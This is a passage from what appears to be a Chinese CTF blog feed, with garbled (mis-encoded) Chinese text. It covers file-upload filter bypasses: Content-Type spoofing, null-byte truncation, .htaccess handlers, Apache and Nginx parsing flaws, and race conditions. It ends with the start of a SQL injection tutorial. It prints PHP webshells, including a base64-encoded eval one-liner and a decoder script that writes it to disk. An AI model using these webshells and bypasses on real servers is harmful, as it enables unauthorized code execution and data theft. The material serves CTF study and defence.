href="#æŠ“åŒ…ä¿®æ”¹åç¼€ç»•è¿‡" class="headerlink" title="æŠ“åŒ…ä¿®æ”¹åç¼€ç»•è¿‡"></a>æŠ“åŒ…ä¿®æ”¹åç¼€ç»•è¿‡</h4><p>å…ˆä¸Šä¼ ç¬¦åˆé¢˜ç›®è¦æ±‚çš„åç¼€åæ–‡ä»¶ï¼Œå¯ä»¥æ˜¯phpä¸€å¥è¯æœ¨é©¬æ–‡ä»¶æ”¹æˆçš„å›¾ç‰‡é©¬</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4ne6y4387j21f20pewke.jpg"                      alt="image-20220729062458268"                ><figcaption>image-20220729062458268</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4ne85hp8ej218e0nw0y7.jpg"                      alt="image-20220729062608013"                ><figcaption>image-20220729062608013</figcaption></figure></p><p>ä¿®æ”¹å®Œç‚¹å‡»forwardï¼Œåˆ°æœåŠ¡å™¨åç«¯å‘ç°æˆåŠŸä¸Šä¼ æˆphpæ–‡ä»¶</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4ne98rphnj20qg0be74p.jpg"                      alt="image-20220729062711209"                ><figcaption>image-20220729062711209</figcaption></figure></p><h4 id="å…¶ä»–ç»•è¿‡æ–¹å¼ï¼š"><a href="#å…¶ä»–ç»•è¿‡æ–¹å¼ï¼š" class="headerlink" title="å…¶ä»–ç»•è¿‡æ–¹å¼ï¼š"></a>å…¶ä»–ç»•è¿‡æ–¹å¼ï¼š</h4><p>1.åœ¨æ§åˆ¶å°é‡æ–°å®šä¹‰å‡½æ•° <code>function checkFile()&#123;&#125;</code> å›è½¦å³å¯(<strong>æ³¨ï¼šéœ€è¦åœ¨æœªè§¦å‘è¯¥å‡½æ•°å‰</strong>)</p><p>2.F12æ‰“å¼€æ§åˆ¶å°ï¼Œé€‰æ‹©å…³é—­JavaScript</p><h2 id="åç«¯ç™½åå•ç»•è¿‡"><a href="#åç«¯ç™½åå•ç»•è¿‡" class="headerlink" title="åç«¯ç™½åå•ç»•è¿‡"></a>åç«¯ç™½åå•ç»•è¿‡</h2><h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><p>åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ ‡è®°æ–‡ä»¶ç±»å‹çš„ä¸€ç§æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ HTTP æ–‡ä»¶è¯·æ±‚å¤´ä¸­çš„ Content-Type </p><h3 id="å¸¸è§æºç "><a href="#å¸¸è§æºç " class="headerlink" title="å¸¸è§æºç "></a>å¸¸è§æºç </h3><p>ç™½åå•æ£€æµ‹</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>))</span><br></pre></td></tr></table></figure></div><h4 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><p>bpæŠ“åŒ…ï¼Œä¸Šä¼ phpæœ¨é©¬ï¼Œè€Œåä¿®æ”¹Content-Type ä¸ºé¢˜ç›®è¦æ±‚ï¼Œä¹Ÿå¯å°è¯•å†å°†ä¸Šé¢çš„Content-Typeçš„multipart&#x2F;form-data ç¬¬ä¸€ä¸ªå­—ç¬¦ m æ”¹æˆ Mï¼Œå³ Multipart&#x2F;form-dataï¼ˆä¸å½±å“ä¼ è¾“ï¼‰ </p><blockquote><p>å¤§å†™ Multipartç»•è¿‡åŒæ ·ä¹Ÿè¦æ”¹</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4neyl8061j21940pq7ak.jpg"                      alt="image-20220729065132723"                ><figcaption>image-20220729065132723</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4neyhl0plj21940pq7ak.jpg"                      alt="image-20220729065127148"                ><figcaption>image-20220729065127148</figcaption></figure></p><h3 id="00æˆªæ–­-1ï¼ˆGET-POSTï¼‰"><a href="#00æˆªæ–­-1ï¼ˆGET-POSTï¼‰" class="headerlink" title="00æˆªæ–­-1ï¼ˆGET|POSTï¼‰"></a>00æˆªæ–­-1ï¼ˆGET|POSTï¼‰</h3><p><a class="link"   href="https://tatsumaki.cn/2020/07/29/00jieduan/" >å…³äºä¸Šä¼ ä¸­00æˆªæ–­çš„ç†è§£ä¸åˆ†æ | Tatsumakiâ€™Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>è¦æ±‚GPCå¤„äºå…³é—­çŠ¶æ€ï¼Œä¸”phpç‰ˆæœ¬å°äº5.3.29æ‰å¯åˆ©ç”¨</p><p>åœ¨æ•°æ®åŒ…ä¸­ï¼Œå«æœ‰ä¸Šä¼ åæ–‡ä»¶ç›®å½•çš„æƒ…å†µæ‰å¯ä½¿ç”¨ã€‚æ¯”å¦‚åœ¨æ•°æ®åŒ…ä¸­å­˜åœ¨pathï¼š&#x2F;uploads&#x2F;</p><p>è¿™æ ·ä¸€æ¥ï¼Œç¨‹åºæå–åç¼€åçš„æ—¶å€™å°±ä¼šåˆæ³•ï¼Œç„¶åæ‹¼æ¥è·¯å¾„ä¸æ–‡ä»¶åã€‚è¿™ä¸ªæ—¶å€™çš„æ‹¼æ¥ç»“æœåº”è¯¥å°±æ˜¯ï¼š&#x2F;uploads&#x2F;1.php%00&#x2F;xxxxxxxx.php</p><p>äºæ˜¯ç§»åŠ¨æ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä¼šæŠŠ00åé¢çš„ä¸œè¥¿è§†ä½œä¸å­˜åœ¨ï¼Œç»“æœå°±å˜æˆäº†&#x2F;uploads&#x2F;1.phpï¼Œä»è€Œgetshellã€‚</p><blockquote><p>pathåœ¨urlã€cookieæˆ–è€…ä¸Šä¼ æ–¹å¼ä¸æ˜¯multipart&#x2F;from-dataçš„æ—¶å€™ï¼Œå°±ä¸ç”¨è¿›è¡Œurlç¼–ç </p></blockquote><h2 id="åç«¯é»‘åå•ç»•è¿‡"><a href="#åç«¯é»‘åå•ç»•è¿‡" class="headerlink" title="åç«¯é»‘åå•ç»•è¿‡"></a>åç«¯é»‘åå•ç»•è¿‡</h2><h3 id="ç‰¹æ®Šè§£æåç¼€"><a href="#ç‰¹æ®Šè§£æåç¼€" class="headerlink" title="ç‰¹æ®Šè§£æåç¼€"></a>ç‰¹æ®Šè§£æåç¼€</h3><p>é»‘åå•è§„åˆ™ä¸ä¸¥è°¨ï¼Œåœ¨æŸäº›ç‰¹å®šçš„ç¯å¢ƒä¸­ï¼ŒæŸäº›ç‰¹æ®Šçš„åç¼€åä»ç„¶ä¼šè¢«å½“åšphpæ–‡ä»¶è§£æã€‚<br>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml</p><h3 id="htaccessåˆ©ç”¨"><a href="#htaccessåˆ©ç”¨" class="headerlink" title=".htaccessåˆ©ç”¨"></a>.htaccessåˆ©ç”¨</h3><p>åŸç†ï¼š </p><ol><li>.htaccess æ–‡ä»¶æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³åœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€æ¡æˆ–å¤šæ¡æŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡ Apache çš„ AllowOverride æŒ‡ä»¤æ¥è®¾ç½®ã€‚</li></ol><p>2.htaccess ä¸­æœ‰ # å•è¡Œæ³¨é‡Šç¬¦, ä¸”æ”¯æŒ \æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œã€‚</p><h4 id="ä¸Šä¼ -htaccessæ–‡ä»¶å†…å®¹ä¸º"><a href="#ä¸Šä¼ -htaccessæ–‡ä»¶å†…å®¹ä¸º" class="headerlink" title="ä¸Šä¼ .htaccessæ–‡ä»¶å†…å®¹ä¸º"></a>ä¸Šä¼ .htaccessæ–‡ä»¶å†…å®¹ä¸º</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt; </span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>å°†ä¸Šä¼ çš„1.jpgæ–‡ä»¶æŒ‰phpæ–‡ä»¶æ‰§è¡Œ</p><p>SetHandleræŒ‡ä»¤å¯ä»¥å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç†ã€‚</p></blockquote><blockquote><p>.htaccessæ€»ç»“</p><p>1.htaccessæ–‡ä»¶ä½¿ç”¨è¦å¼€å¯apache httpd.config AllowOverride All è€Œä¸”è¦é‡å¯æœåŠ¡æ‰èƒ½ç”Ÿæ•ˆ å’Œ<strong>LoadModule rewrite_module modules&#x2F;mod_rewrite.so æ²¡å…³ç³»</strong></p><p>2.é›†æˆç¯å¢ƒç®€å•ä½†æ˜¯ä¸å®‰å…¨æ‰€æœ‰çš„å®‰å…¨é…ç½®éƒ½æ˜¯å¼€å¯çš„ï¼ŒåŸå§‹å¹³å°å®‰è£…é…ç½®ç¨å¤æ‚ä½†æ˜¯å®‰å…¨ç³»æ•°é«˜é…ç½®éƒ½æ˜¯é»˜è®¤å…³é—­çš„ï¼Œè€Œä¸”ä¸€èˆ¬é›†æˆç¯å¢ƒæ‹¿åˆ°çš„shellåŸºæœ¬ä¸Šæ˜¯æœ€é«˜æƒé™</p><p><strong>3.ä¸Šä¼ ä½¿ç”¨.htaccessæ–‡ä»¶å¦‚æœç¢°åˆ°æ˜¯é»‘åå•å¤„ç†å¹¶ä¸”æ˜¯é›†æˆç¯å¢ƒæ­å»ºçš„ç¯å¢ƒé‚£å°±åˆå¾ˆå¤§çš„å¯èƒ½ç»•è¿‡éªŒè¯getshellï¼Œä¸æ˜¯çš„è¯å°±åªèƒ½å‡­è¿æ°”çœ‹ç«™é•¿æ˜¯å¦å¼€å¯äº†AllowOverride All</strong></p></blockquote><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><p>windowå¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œlinuxå¯¹å¤§å°å†™æ•æ„Ÿ</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.Php</span><br></pre></td></tr></table></figure></div><blockquote><p>é»‘åå•æ›¿æ¢è¦æ³¨æ„æ›¿æ¢å­—ç¬¦ï¼Œå¦‚æœæ›¿æ¢æˆç©ºå­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå¦‚æœæ›¿æ¢æˆç©ºæ ¼æˆ–å…¶ä»–å­—ç¬¦ï¼Œåˆ™è¦æ”¾å¼ƒåŒå†™æ€è·¯ï¼Œå°è¯•å¤§å°å†™ç»•è¿‡</p></blockquote><h3 id="DATAç»•è¿‡"><a href="#DATAç»•è¿‡" class="headerlink" title="::$$DATAç»•è¿‡"></a>::$$DATAç»•è¿‡</h3><p>åˆ©ç”¨NTFSæ–‡ä»¶æµç‰¹æ€§</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4nzrueqfhj210s0eomz3.jpg"                      alt="image-20220729185140457"                ><figcaption>image-20220729185140457</figcaption></figure></p><blockquote><p>åœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+<code>&quot;::$DATA&quot;</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ<code>::$DATA</code>ä¹‹å‰çš„æ–‡ä»¶åï¼Œä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</p></blockquote><h3 id="ç‚¹ç»•è¿‡"><a href="#ç‚¹ç»•è¿‡" class="headerlink" title="ç‚¹ç»•è¿‡"></a>ç‚¹ç»•è¿‡</h3><p>windowsç­‰ç³»ç»Ÿé»˜è®¤åˆ é™¤æ–‡ä»¶åç¼€çš„.å’Œç©ºæ ¼ï¼ŒæŸ¥çœ‹ç½‘ç«™æºç å‘ç°ï¼Œæ²¡æœ‰è¿‡æ»¤ç‚¹</p><h2 id="é…åˆè§£ææ¼æ´"><a href="#é…åˆè§£ææ¼æ´" class="headerlink" title="é…åˆè§£ææ¼æ´"></a>é…åˆè§£ææ¼æ´</h2><h3 id="Apache-HTTPDæ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"><a href="#Apache-HTTPDæ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰" class="headerlink" title="Apache HTTPDæ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"></a>Apache HTTPDæ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</h3><p>åœ¨2.4.0~2.4.29ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æphpæ—¶ï¼Œ<strong>1.php\x0A</strong>å°†æŒ‰ç…§<strong>php</strong>åç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥</p><ul><li>ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¢è¡Œç¬¦çš„æ–‡ä»¶ã€‚æ³¨æ„ï¼Œåªèƒ½æ˜¯<code>\x0A</code>ï¼Œä¸èƒ½æ˜¯<code>\x0D\x0A</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨hexåŠŸèƒ½åœ¨1.phpåé¢æ·»åŠ ä¸€ä¸ª<code>\x0A</code></li><li>ç„¶åè®¿é—®<code>/1.php%0A</code>ï¼Œå³å¯å‘ç°å·²ç»æˆåŠŸgetshell</li></ul><blockquote><ul><li><p>è·å–æ–‡ä»¶åæ—¶ä¸èƒ½ç”¨<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>ï¼Œå› ä¸ºä»–ä¼šè‡ªåŠ¨æŠŠæ¢è¡Œå»æ‰ï¼Œè¿™ä¸€ç‚¹æœ‰ç‚¹é¸¡è‚‹</p></li><li><p>é»˜è®¤çš„Apacheé…ç½®å³å¯åˆ©ç”¨ï¼Œå› ä¸ºé»˜è®¤Apacheé…ç½®å°±ä½¿ç”¨äº†<code>&lt;FileMatch&gt;</code>ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div></li></ul><p><strong>æ‰€ä»¥ç†è®ºä¸Šï¼Œåªè¦ç”¨æ­£åˆ™æ¥åŒ¹é…åç¼€è¿›è¡Œphpè§£æçš„Apacheå°±æœ‰è¿™ä¸ªé—®é¢˜ã€‚è€Œè¿™ä¸ªåšæ³•åˆšå¥½æ˜¯ä¸ºäº†è§£å†³<a class="link"   href="https://github.com/vulhub/vulhub/tree/master/httpd/apache_parsing_vulnerability" >Apacheè€çš„è§£ææ¼æ´ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>è€Œåšçš„ï¼Œå¯è°“éæ­¤å³å½¼ï¼Œå¿…ç„¶å­˜åœ¨ä¸€ç§è§£ææ¼æ´ã€‚</strong></p></blockquote><h3 id="Nginx-è§£ææ¼æ´"><a href="#Nginx-è§£ææ¼æ´" class="headerlink" title="Nginx è§£ææ¼æ´"></a><strong>Nginx è§£ææ¼æ´</strong></h3><p>ç”±äºnginx.confçš„å¦‚ä¸‹é…ç½®å¯¼è‡´nginxæŠŠä»¥â€™.phpâ€™ç»“å°¾çš„æ–‡ä»¶äº¤ç»™fastcgiå¤„ç†,å¯¹äºä»»æ„æ–‡ä»¶åï¼Œåœ¨åé¢æ·»åŠ &#x2F;xxx.phpï¼ˆxxxï¼‰ä¸ºä»»æ„å­—ç¬¦åï¼Œå³å¯å°†æ–‡ä»¶ä½œä¸ºphpè§£æã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸Šä¼ shell.jpg</span><br><span class="line">è®¿é—®shell.jpg/.php    ä¼šæŒ‰ç…§shell.phpæ‰§è¡Œ</span><br></pre></td></tr></table></figure></div><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="æ–‡ä»¶å¤´æ£€æµ‹"><a href="#æ–‡ä»¶å¤´æ£€æµ‹" class="headerlink" title="æ–‡ä»¶å¤´æ£€æµ‹"></a>æ–‡ä»¶å¤´æ£€æµ‹</h3><p>å½“æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç™½åå•è¿›è¡Œçš„æ–‡ä»¶å¤´æ£€æµ‹ã€‚<br>JPEG (jpg)ï¼Œæ–‡ä»¶å¤´ï¼šFFD8FF<br>PNG (png)ï¼Œæ–‡ä»¶å¤´ï¼š89504E47<br>GIF (gif)ï¼Œæ–‡ä»¶å¤´ï¼š47494638</p><blockquote><p>pngæœ‰æ—¶ä¼šåŠ å…¥HIDRå¤´æ£€æµ‹ï¼Œä¸»è¦æ ‡å¿—æ˜¯getimagesizeå‡½æ•°</p></blockquote><h3 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h3><p>ä¸Šä¼ æ–‡ä»¶åï¼Œç½‘ç«™ä¼šå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡å¤„ç†ï¼ˆæ ¼å¼ã€å°ºå¯¸è¦æ±‚ç­‰ï¼‰ï¼Œå¤„ç†ååœ¨æ”¾åˆ°ç½‘ç«™å¯¹åº”çš„æ ‡ç­¾è¿›è¡Œæ˜¾ç¤ºã€‚</p><p>å¦‚ä½•ç»•è¿‡å‘¢<br>1.å°†ä¸€å¥è¯æ’å…¥ç½‘ç«™äºŒæ¬¡å¤„ç†çš„å›¾ç‰‡ï¼ŒæŠŠä¸€å¥è¯æ’å…¥å›¾ç‰‡åœ¨äºŒæ¬¡æ¸²æŸ“åä¼šä¿ç•™çš„é‚£éƒ¨åˆ†æ•°æ®é‡Œï¼Œç¡®ä¿ä¸ä¼šåœ¨äºŒæ¬¡å¤„ç†æ—¶åˆ é™¤æ‰ã€‚</p><blockquote><p>é€‰æ‹©gifæ–‡ä»¶æˆåŠŸç‡å¤§ï¼Œå‡ºç°æ— å˜åŒ–ç‰‡æ®µå¤§å‡ ç‡å¤§</p></blockquote><h3 id="æ¡ä»¶ç«äº‰æ¼æ´"><a href="#æ¡ä»¶ç«äº‰æ¼æ´" class="headerlink" title="æ¡ä»¶ç«äº‰æ¼æ´"></a>æ¡ä»¶ç«äº‰æ¼æ´</h3><p>æ¡ä»¶ç«äº‰ä¸ºç‰¹åˆ«æ¼æ´ï¼Œæ˜¯æ–‡ä»¶ä¸Šä¼ è¿›è¡ŒéªŒè¯çš„çŸ­æš‚æ—¶é—´å†…ã€‚å¯¹ä¼ å…¥çš„æ–‡ä»¶è¿›è¡Œäº†ä¸´æ—¶ä¿å­˜ï¼Œå¯èƒ½æ˜¯ä¸€ç§’ï¼Œä¹Ÿå¯èƒ½æ˜¯0.å‡ ç§’ã€‚ä½†åœ¨è¿™çŸ­æš‚æ—¶é—´å†…phpæ˜¯å¯ä»¥è§£æçš„ï¼Œå¦‚æœè§£æçš„é€Ÿåº¦å¤Ÿå¿«ã€‚</p><p>ç»•è¿‡ï¼š<br>ä¸Šä¼ 1.phpæ–‡ä»¶ï¼Œåˆ©ç”¨bpæŠ“åŒ…ï¼Œè®¾ç½®å¤šçº¿ç¨‹ï¼Œä¸æ–­å‘åŒ…ã€‚æµè§ˆå™¨è®¿é—®è¿æ¥æˆ‘ä»¬ä¸Šä¼ çš„1.phpæ–‡ä»¶ã€‚ä¸æ–­åˆ·æ–°ï¼Œä¼šåœ¨æŸç¬é—´ï¼Œæ‰§è¡Œ1.phpæˆåŠŸã€‚</p><h2 id="å±é™©å‡½æ•°æ£€æµ‹"><a href="#å±é™©å‡½æ•°æ£€æµ‹" class="headerlink" title="å±é™©å‡½æ•°æ£€æµ‹"></a>å±é™©å‡½æ•°æ£€æµ‹</h2><p>ä¸€èˆ¬ä¸ºwafå¯¹ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹è¿›è¡Œæ£€æµ‹</p><p>1.ä½¿ç”¨åŠ¨æ€è°ƒç”¨ç»•è¿‡ï¼Œä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_GET[&#x27;0&#x27;]($_GET[&#x27;1&#x27;]);?&gt;</span><br><span class="line">æ­¤æ–¹æ³•ä¸èƒ½ç»•è¿‡disable_function</span><br><span class="line">12</span><br></pre></td></tr></table></figure></div><p>2.ä¸Šä¼ ç¼–ç åçš„webshellé…åˆ.htaccessæ¥è§£æ</p><p>3.ä¸Šä¼ ç¼–ç åçš„webshellï¼Œå†å¦å¤–ä¸Šä¼ ä¸€ä¸ªè„šæœ¬æ–‡ä»¶è§£ç webshellå¹¶å†™å…¥æ–°æ–‡ä»¶ï¼Œä¾‹å¦‚ä¸‹é¢è¿™æ®µä»£ç ä¸º1.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div><p>ä¸Šä¼ åå†ä¸Šä¼ ä¸‹é¢ä¸º2.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$path =&quot;/xx/xxx/xx/1.php&quot;;</span><br><span class="line"></span><br><span class="line">$str= file_get_contents($path);</span><br><span class="line"></span><br><span class="line">$strs = base64_decode($str);</span><br><span class="line"></span><br><span class="line">$test = fopen(&quot;./test.php&quot;,&quot;w&quot;);test</span><br><span class="line">test</span><br><span class="line">fwrite($test,$strs);</span><br><span class="line">fclose($test);</span><br><span class="line">?&gt;</span><br><span class="line">12345678910111213</span><br></pre></td></tr></table></figure></div><p>ç„¶åè®¿é—®åå†è®¿é—®test.phpå³å¯getshell</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥å­¦ä¹ </title>
      <link href="/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥åŸç†"><a href="#SQLæ³¨å…¥åŸç†" class="headerlink" title="SQLæ³¨å…¥åŸç†"></a>SQLæ³¨å…¥åŸç†</h1><h2 id="ä¸€ã€å®šä¹‰"><a href="#ä¸€ã€å®šä¹‰" class="headerlink" title="ä¸€ã€å®šä¹‰"></a>ä¸€ã€å®šä¹‰</h2><p>SQLæ³¨å…¥æ˜¯æŒ‡åœ¨åˆ¤æ–­å‡ºæ³¨å…¥ç‚¹åï¼Œå°†<strong>æ¶æ„çš„SQLè¯­å¥</strong>æ·»åŠ åˆ°è¾“å…¥å‚æ•°ä¸­ï¼Œä½¿å¾—åå°æœåŠ¡å™¨<u>æ‰§è¡Œæ·»åŠ çš„SQLè¯­å¥</u>ï¼Œä»è€Œè¾¾åˆ°çªƒå–ç½‘ç«™æ•æ„Ÿä¿¡æ¯ç­‰ç›®çš„</p><h2 id="äºŒã€å®ä¾‹åŠåŸç†"><a href="#äºŒã€å®ä¾‹åŠåŸç†" class="headerlink" title="äºŒã€å®ä¾‹åŠåŸç†"></a>äºŒã€å®ä¾‹åŠåŸç†</h2><h3 id="2-1å­—ç¬¦å‹æ³¨å…¥-dvwaå¹³å°sqlæ³¨å…¥ç®€å•çº§åˆ«"><a href="#2-1å­—ç¬¦å‹æ³¨å…¥-dvwaå¹³å°sqlæ³¨å…¥ç®€å•çº§åˆ«" class="headerlink" title="2.1å­—ç¬¦å‹æ³¨å…¥(dvwaå¹³å°sqlæ³¨å…¥ç®€å•çº§åˆ«)"></a>2.1å­—ç¬¦å‹æ³¨å…¥(dvwaå¹³å°sqlæ³¨å…¥ç®€å•çº§åˆ«)</h3><h4 id="æŸ¥çœ‹å›æ˜¾"><a href="#æŸ¥çœ‹å›æ˜¾" class="headerlink" title="æŸ¥çœ‹å›æ˜¾"></a>æŸ¥çœ‹å›æ˜¾</h4><p>è¾“å…¥ç”¨æˆ·idä¸º1ï¼Œå‘ç°URLä¸­ä¹Ÿå‡ºç°ID&#x3D;1ï¼Œè¯´æ˜ä½¿ç”¨getæ–¹å¼ä¼ å‚æ•°ï¼ŒæŸ¥çœ‹å›æ˜¾ï¼Œè¿”å›äº†IDä¸º1çš„ç”¨æˆ·ä¿¡æ¯<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221760.png"                      alt="1"                ><figcaption>1</figcaption></figure></p><h4 id="å®¡è®¡æºä»£ç "><a href="#å®¡è®¡æºä»£ç " class="headerlink" title="å®¡è®¡æºä»£ç "></a>å®¡è®¡æºä»£ç </h4><ul><li>å‘ç°ä¸»è¦æ‰§è¡Œçš„SQLè¯­å¥ä¸º:</li></ul><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ç±»ä¼¼è¿™ç±»ä¼ å…¥å‚æ•°ä»¥<code>&#39;</code>åŒ…è£¹çš„ç§°ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œå¯ä»¥é€šè¿‡ä¼ å…¥ <code>1&#39; xxx#</code>(xxxä¸ºæ¶æ„çš„SQLè¯­å¥)çš„æ–¹å¼æ¥æ‰§è¡Œæ¶æ„çš„SQLè¯­å¥<br><strong>åŸå› </strong>:</p><ul><li>æ•°å­—åè·Ÿçš„<code>&#39;</code>ä¸æºç 